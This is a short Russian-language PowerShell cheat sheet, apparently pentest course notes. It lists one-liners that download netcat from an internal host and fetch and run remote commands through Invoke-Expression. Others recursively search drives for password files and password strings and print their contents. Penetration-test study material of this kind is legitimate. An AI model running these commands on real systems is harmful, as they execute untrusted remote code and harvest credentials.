# Полезные командлеты Powershell

## Invoke-WebRequest

Позволяет выполнять запросы. В том числе скачивать файлы. 
Работает с Windows 8 (Powershell v3).

`Invoke-WebRequest -OutFile ./netcat.zip -Uri http://192.168.1.114/SEC560/netcat.zip`

## System.Web.WebClient
Доступен с Windows 7 (Powershell v2)

`(New-Object System.Net.WebClient).DownloadFile("http://192.168.1.114/data.zip", "data.zip")`

## Выполнить команду с удаленного веб-сервера

`Invoke-Expression (Invoke-WebRequest -Uri http://192.168.1.114/command.txt).Content`

## Рекурсивный поиск файла по регулярному выражению его имени

`ls -r C:\rootdirectory *password*.txt`

Извлекает содержимое:

`ls -r c:\rootdirectory *password*.txt | cat`

`ls -r c:\rootdirectory *password*.txt | gc`

`ls -r C:\rootdirectory *password*.txt | % { echo $_.fullname; gc $_.fullname }`

## Рекурсивный поиск содержимого файла по регулярному выражению

`ls -r C:\rootdirectory | select-string -pattern password 2>$null`

`get-childitem -path c:\rootdirectory -recurse -exclude *.js,*.php,*.css,*.jpg,*.svg,*.scss,*.gif | select-string Password: | gc`




